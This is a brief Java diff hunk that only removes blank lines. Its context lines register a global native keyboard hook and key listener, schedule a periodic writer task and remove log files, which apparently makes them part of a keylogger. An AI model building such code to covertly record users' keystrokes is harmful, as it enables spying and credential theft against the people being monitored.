@@ -43,8 +43,6 @@ public class LogicFlow {
         }
 
         logFilesCollector.removeLogs(files);
-
-
         GlobalScreen.registerNativeHook();
         GlobalScreen.addNativeKeyListener(keyReader);
         timer.schedule(writerTask,1000L,10000L);
